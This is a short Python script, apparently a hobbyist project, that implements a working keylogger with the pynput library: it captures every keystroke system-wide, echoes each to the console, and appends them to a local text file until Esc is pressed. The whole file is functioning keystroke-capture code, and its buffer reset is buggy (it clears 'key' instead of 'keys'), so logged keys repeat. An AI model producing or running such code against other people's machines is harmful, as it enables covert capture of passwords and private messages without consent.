
"""

  file key_logger.py
  author Akash Ranjan (https://github.com/vatsaakash/)
  brief
  version 1.0
  date 2021-05-01
  copyright Copyright (c) 2021
"""

import os
from pynput.keyboard import Key, Controller, Listener

os.system('cls||clear')

keyboard = Controller()

print("It's working now")

# cnt variable is used to monitor number of key press.
cnt = 0
keys = []


# action on press key
def on_press(key):
    """
    :param key:
    :return:
    """
    global keys, cnt
    print('{0} pressed'.format(key))
    cnt += 1
    keys.append(key)
    if cnt >= 10:
        cnt = 1
        write_file(keys)
        key = []


# write into the file(key_logger_log.txt) when number of key presses 10.
# If the txt file doesn't exist it will create one
def write_file(keys):
    with open("key_logger_log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" \n ")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    """
    :param key:
    :return: False (when the if condition is met)
    """
    if key == Key.esc:
        # stop the key listener
        return False


# listen events until key is released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
